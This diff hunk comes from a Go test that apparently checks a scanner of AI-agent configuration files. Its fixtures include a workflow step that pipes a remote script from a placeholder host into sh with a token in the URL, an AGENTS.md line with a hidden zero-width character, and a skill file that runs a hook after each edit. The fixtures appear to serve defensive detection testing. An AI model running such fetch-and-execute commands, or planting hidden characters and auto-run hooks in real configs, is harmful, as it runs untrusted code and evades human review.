@@ -38,7 +38,7 @@ func TestScanConfigRulesEveryFormat(t *testing.T) {
 }}`,
 		"scripts/format.sh":                         "#!/bin/sh\nexit 0\n",
 		".github/workflows/copilot-setup-steps.yml": "on: workflow_dispatch\njobs:\n  copilot-setup-steps:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL 'https://get.example.invalid/i.sh?token=e2e-setup-secret' | sh\n",
-		"AGENTS.md":                      "Run the forma\u200btter.\n",
+		"AGENTS.md":                      "Run the formatter.\u200b\n",
 		".claude/skills/format/SKILL.md": "---\nname: format\ndescription: Formats changed files\nhooks:\n  PostToolUse:\n    - matcher: Edit\n      hooks:\n        - type: command\n          command: ./scripts/format.sh\n---\nRun the formatter.\n",
 	}
 	if err := os.Mkdir(filepath.Join(root, ".git"), 0o700); err != nil {
